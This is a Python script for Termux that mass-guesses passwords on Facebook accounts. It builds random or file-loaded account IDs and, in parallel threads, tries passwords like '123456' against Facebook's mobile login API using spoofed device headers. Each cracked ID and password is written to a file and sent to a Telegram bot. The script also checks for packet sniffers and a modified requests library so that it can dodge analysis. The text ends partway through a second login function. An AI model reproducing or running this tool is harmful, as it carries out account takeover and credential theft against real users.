import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

import os, sys

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def open_url(url):
    if os.name == 'nt':
        os.system(f'start {url}')
    elif 'com.termux' in os.environ.get('PREFIX', ''):
        os.system(f'termux-open-url {url}')
    else:
        os.system(f"xdg-open '{url}'")

# --- HÀM INPUT AN TOÀN (CHỐNG SKIP TRÊN TERMUX) ---
def safe_input(prompt):
    """Input an toàn - bắt buộc phải nhập ít nhất 1 ký tự, bỏ qua Enter rỗng"""
    while True:
        val = input(prompt).strip()
        if val:
            return val

# --- XÓA BUFFER STDIN THỪA ---
try:
    import termios
    termios.tcflush(sys.stdin, termios.TCIFLUSH)
except:
    pass

# --- PHẦN CHÈN THÊM: CẤU HÌNH TELEGRAM & CHECKER ---
clear_screen()
print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\033[1;32m   CẤU HÌNH HỆ THỐNG TRÊN TERMUX")
print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

config_file = 'config.json'
load_success = False

if os.path.exists(config_file):
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            config = json.load(f)
            TELE_TOKEN = config.get('TELE_TOKEN', '')
            CHAT_ID = config.get('CHAT_ID', '')
            FB_COOKIE = config.get('FB_COOKIE', '')
            FB_TOKEN = config.get('FB_TOKEN', '')
            
            print("\033[1;32m[✓] Đã nạp cấu hình từ file config.json thành công!\033[0m")
            print("    1. Dùng cấu hình cũ")
            print("    2. Nhập cấu hình mới")
            choice = safe_input("\033[1;36m[?] Chọn (1/2): \033[0m")
            if choice == '1':
                load_success = True
    except:
        pass

if not load_success:
    TELE_TOKEN = safe_input("\033[1;36m[+] Nhập Token Bot Telegram: \033[0m")
    print("\033[1;36m[+] Chọn nơi nhận thông báo:\033[0m")
    print("    1. Gửi về Nhóm (Group ID)")
    print("    2. Gửi về Cá nhân (Admin ID)")
    tele_choice = safe_input("\033[1;36m[?] Nhập lựa chọn (1/2): \033[0m")
    if tele_choice == '1':
        CHAT_ID = safe_input("\033[1;36m[+] Nhập ID Nhóm (ví dụ có dấu trừ: -100xxxxx): \033[0m")
    else:
        CHAT_ID = safe_input("\033[1;36m[+] Nhập ID Cá nhân: \033[0m")
    FB_COOKIE = safe_input("\033[1;36m[+] Nhập Cookie Facebook (để check live): \033[0m")
    FB_TOKEN = safe_input("\033[1;36m[+] Nhập Token Facebook (EAAG...): \033[0m")

    with open(config_file, 'w', encoding='utf-8') as f:
        json.dump({
            'TELE_TOKEN': TELE_TOKEN,
            'CHAT_ID': CHAT_ID,
            'FB_COOKIE': FB_COOKIE,
            'FB_TOKEN': FB_TOKEN
        }, f, indent=4)
    print("\033[1;32m[✓] Đã lưu thông tin vào config.json!\033[0m")

PROXIES = None

print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def send_to_tele(uid, pw, year, status):
    """Gửi kết quả về Telegram"""
    message = f"✅  Scan Thành Công!(Dang Phu)\n━━━━━━━━━━━━\n🆔 ID: {uid}\n🔑 MK: {pw}\n📅 Năm: {year}\n🚦 Trạng thái: {status}\n━━━━━━━━━━━━"
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.get(url, params=params)
    except:
        pass

def send_notification(text):
    """Gửi thông báo hệ thống về Telegram"""
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": f"⚙️ HỆ THỐNG SCAN VIA ⚙️\n{text}"}
    try:
        requests.get(url, params=params)
    except:
        pass

def check_fb_live(uid, cookie):
    """Kiểm tra acc live hay die bằng cookie"""
    try:
        headers = {
            'authority': 'mbasic.facebook.com',
            'cookie': cookie,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        res = requests.get(f'https://mbasic.facebook.com/{uid}', headers=headers, proxies=PROXIES, timeout=20).text
        if 'Nội dung không hiển thị' in res or 'Bạn không thể sử dụng tính năng này' in res:
            return "DIE ❌"
        else:
            return "LIVE ✅"
    except:
        return "UNKNOWN ⚠️"
# --- HẾT PHẦN CHÈN THÊM ---

# WhatsApp Group Link
channel_link = ""

# Tool ka main code yahan likho
print(">>> Tool Successfully Unlocked <<<")



# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
clear_screen()
print(' \x1b[38;5;46m EMONBDZONE SERVER LOADING....')


os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx beautifulsoup4 pysocks "requests[socks]"')
print('loading Modules ...\n')
clear_screen()
# open_url("https://www.facebook.com/profile.php?id=61580049020011&mibextid=wwXIfr&mibextid=wwXIfr")

# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【DangPhu】𓆪 \x07')


    # EMON Logo - Speed - Version 2.5
def ____banner____():
    clear_screen()
    
    print("""\033[1;32m
        
                  (\  (\
 („• ֊ •„)   LoVE. . . 💌
 ━O━O━━━━━━━━━━━━━━━━━━━━━━━
[Name]'s Intro! 🐇 💨 
┊🌺 Name : dphu
┊
============================
                TOOL BY Tran Dang Phu 
\033[0m""")


def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('10001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 6:
        return '2005'
    elif len(uid) in (1, 2, 3, 4, 5):
        return '2004'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    clear_screen()


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD ACCOUNT TOOL')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCRACK FROM FILE UID (FILE CLONE)')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    elif __Jihad__ in ('B', 'b', '02', '2'):
        old_Five()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2004-2007 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    elif _input in ('D', 'd', '04', '4'):
        old_Four()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2004-2007. (No file needed)
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2004-2007")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    
    # Quét ngẫu nhiên UID từ dải 4 đến 99,999,999 (2004-2007)
    for _ in range(int(limit)):
        data = str(random.randint(4, 99999999))
        user.append(data)

    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        send_notification(f"🚀 Bắt đầu chiến dịch Scan 2004-2007!\n🎯 Số lượng: {limit}\n⚙️ Loại: {'METHOD 1' if meth == 'A' else 'METHOD 2'}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐÀO A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐÀO B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        send_notification(f"🚀 Bắt đầu chiến dịch Scan 2010-2014!\n🎯 Số lượng: {limit}\n⚙️ Loại: {'ĐÀO A' if meth == 'A' else 'ĐÀO B'}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefixes = ['1000004', '1000001', '1000002', '1000003', '1000005', '1000006', '1000007', '1000008', '1000009']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐÀO A')
    print('        \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐÀO B')
    linex()
    meth = input(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOOL CRACK SIÊU MÚP{Y}: {G}{limit}{W}")
        print(f"        \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐOÀN TRUNG DUY{G}")
        linex()
        send_notification(f"🚀 Bắt đầu chiến dịch Scan 2009-2010!\n🎯 Số lượng: {limit}\n⚙️ Loại: {'ĐÀO A' if meth == 'A' else 'ĐÀO B'}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Four():
    """
    Same as old_One - 2004-2007 (Range Method)
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2004-2007")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    
    for _ in range(int(limit)):
        uid = str(random.randint(4, 99999999))
        user.append(uid)

    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOOL CRACK SIÊU MÚP{Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mĐOÀN TRUNG DUY{G}")
        send_notification(f"🚀 Bắt đầu chiến dịch Scan 2004-2007 (Range)!\n🎯 Số lượng: {limit}\n⚙️ Loại: {'METHOD 1' if meth == 'A' else 'METHOD 2'}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
               print(f"    {rad}[!] INVALID METHOD SELECTED")
               break


def old_Five():
    """
    Cloning method for accounts from File UID.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mCRACK FROM FILE UID")
    linex()
    ____banner____()
    file_path = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mFILE PATH (Default: uid.txt) {Y}:{G} ").strip()
    if not file_path:
        file_path = 'uid.txt'
    try:
        with open(file_path, 'r') as f:
            lines = f.read().splitlines()
    except Exception as e:
        print(f"\n    {rad}[!] File Not Found or Error: {e}")
        time.sleep(2)
        return old_clone()

    for line in lines:
        if not line.strip(): continue
        uid = line.split('|')[0].strip()
        if uid.isdigit():
            user.append(uid)
            
    if not user:
        print(f"\n    {rad}[!] Warning: No valid UIDs found in {file_path}!")
        time.sleep(2)
        return old_clone()
        
    print(f"\n    {G}[+] Successfully loaded {len(user)} UIDs!{W}")
    time.sleep(1)

    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {len(user)}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        send_notification(f"🚀 Bắt đầu chiến dịch Scan File UID!\n🎯 Số lượng: {len(user)}\n⚙️ Loại: {'METHOD 1' if meth == 'A' else 'METHOD 2'}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    if PROXIES:
        session.proxies.update(PROXIES)
    try:
        # Thay đổi: Chỉ hiển thị tiến trình loop, không in acc ra termux
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDTD SCANNING\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=20).json()
            if 'session_key' in res:
                # Gửi Tele thay vì print
                year = creationyear(uid)
                status = check_fb_live(uid, FB_COOKIE)
                send_to_tele(uid, pw, year, status)
                open('DTD-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                year = creationyear(uid)
                status = check_fb_live(uid, FB_COOKIE)
                send_to_tele(uid, pw, year, status)
                open('DTD-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    global loop
